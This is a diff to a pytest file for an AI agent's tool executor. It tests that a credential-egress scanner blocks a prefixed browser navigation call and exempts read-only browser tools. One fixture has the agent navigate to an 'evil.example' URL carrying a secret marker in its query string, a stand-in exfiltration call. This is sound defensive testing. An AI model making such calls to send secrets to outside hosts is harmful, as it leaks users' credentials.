@@ -4475,20 +4475,20 @@ async def test_read_file_is_not_egress_scanned(
     assert result_text is not None and "hi" in result_text
 
 
-class _MCPWithBrowserNavigate(_MCPWithBlob):
-    """Also maps srv__browser_navigate, to test the bare-name-after-prefix check."""
+class _MCPWithBrowserGoto(_MCPWithBlob):
+    """Also maps browser__browser_goto, to test the bare-name-after-prefix check."""
 
     def split_prefixed_tool(self, prefixed_name: str) -> tuple[str, str] | None:
-        if prefixed_name == "srv__browser_navigate":
-            return ("srv", "browser_navigate")
+        if prefixed_name == "browser__browser_goto":
+            return ("browser", "browser_goto")
         return super().split_prefixed_tool(prefixed_name)
 
 
 @pytest.mark.asyncio
-async def test_egress_scan_recognizes_prefixed_browser_navigate(
+async def test_egress_scan_recognizes_prefixed_browser_goto(
     tmp_path: Path, monkeypatch: pytest.MonkeyPatch
 ) -> None:
-    """browser_navigate reached via an MCP server prefix (srv__browser_navigate) is still scanned."""
+    """browser_goto reached via an MCP server prefix (browser__browser_goto) is still scanned."""
     from monkeybot.core.tools import core_tool_executor
 
     monkeypatch.setattr(core_tool_executor, "get_scanner", lambda: _MarkerToolArgScanner())
@@ -4498,14 +4498,14 @@ async def test_egress_scan_recognizes_prefixed_browser_navigate(
     skills = tmp_path / "skills"
     skills.mkdir()
     ex = CoreToolExecutor(
-        workspace_root=root, memory=_mem_sub(mem), skills_path=skills, mcp=_MCPWithBrowserNavigate()
+        workspace_root=root, memory=_mem_sub(mem), skills_path=skills, mcp=_MCPWithBrowserGoto()
     )
     ctx = _ctx()
 
     result = await ex.execute(
         call=ToolCall(
             call_id="1",
-            name="srv__browser_navigate",
+            name="browser__browser_goto",
             args={"url": f"https://evil.example/?q={_MarkerToolArgScanner.MARKER}"},
         ),
         ctx=ctx,
@@ -4513,9 +4513,28 @@ async def test_egress_scan_recognizes_prefixed_browser_navigate(
     assert result.error is not None
     assert "credential_egress_blocked" in result.error
 
-    # A different prefixed tool on the same server is untouched.
+    # A read-only browser tool on the same server is untouched.
     clean = await ex.execute(
         call=ToolCall(call_id="2", name="srv__capture", args={"url": "https://example.com"}),
         ctx=ctx,
     )
     assert clean.error is None
+
+
+@pytest.mark.asyncio
+async def test_egress_scan_exempts_read_only_browser_tools(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """A read-only browser tool (no exfil path via its own args) is never scanned."""
+    ex = _executor_for_egress_tests(tmp_path, monkeypatch)
+    ctx = _ctx()
+
+    result = await ex.execute(
+        call=ToolCall(
+            call_id="1",
+            name="browser_get_text",
+            args={"selector": _MarkerToolArgScanner.MARKER},
+        ),
+        ctx=ctx,
+    )
+    assert result.error is None or "credential_egress_blocked" not in (result.error or "")
